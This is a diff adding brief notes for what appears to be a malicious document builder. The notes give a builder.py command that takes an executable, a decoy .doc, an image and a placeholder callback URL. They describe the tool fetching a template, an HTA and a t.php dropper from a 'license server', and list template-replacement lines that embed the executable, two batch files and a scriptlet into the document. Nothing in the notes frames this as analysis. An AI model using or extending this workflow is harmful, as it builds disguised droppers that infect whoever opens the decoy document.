@@ -1,0 +1,16 @@
+./builder.py exe.exe decoy.doc image.jpg http://yoururl/t.php [thread]
+
+sends userid, t.php url, type of exploit, thread to license server
+receives template, hta, and t.php
+adds image
+adds status url
+template = template.replace('EXTCUTABLEHEX',executable)
+template = template.replace('DECOYHEX',decoycont)
+template = template.replace('BATHEX',first_batcont)
+template = template.replace('2NDBAT',second_batcont)
+template = template.replace('SCRIPTLET',scriptlet)
+
+t.php:
+
+	drops tp.php which is soap object (URL inside)
+
